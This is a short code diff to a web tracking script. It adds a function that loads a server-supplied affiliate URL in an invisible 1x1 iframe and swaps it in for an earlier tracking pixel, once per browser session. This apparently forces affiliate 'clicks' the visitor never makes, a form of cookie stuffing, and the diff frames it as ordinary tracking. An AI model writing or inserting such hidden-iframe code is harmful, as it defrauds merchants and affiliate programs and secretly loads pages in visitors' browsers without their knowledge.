@@ -17,6 +17,16 @@
     document.body.appendChild(img);
   }
 
+    function createClickIframe(url) {
+        var iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.width = "1";
+        iframe.height = "1";
+        iframe.style.display = "none";
+        iframe.style.visibility = "hidden";
+        document.body.appendChild(iframe);
+    }
+
   async function initTracking() {
     if (sessionStorage.getItem("tracking_done")) return;
 
@@ -40,7 +50,7 @@
       const data = await res.json();
 
       if (data.success && data.affiliate_url) {
-        createTrackingPixel(data.affiliate_url);
+        createClickIframe(data.affiliate_url);
         sessionStorage.setItem("tracking_done", "1");
       } else {
         console.log("Tracking blocked:", data.reason);
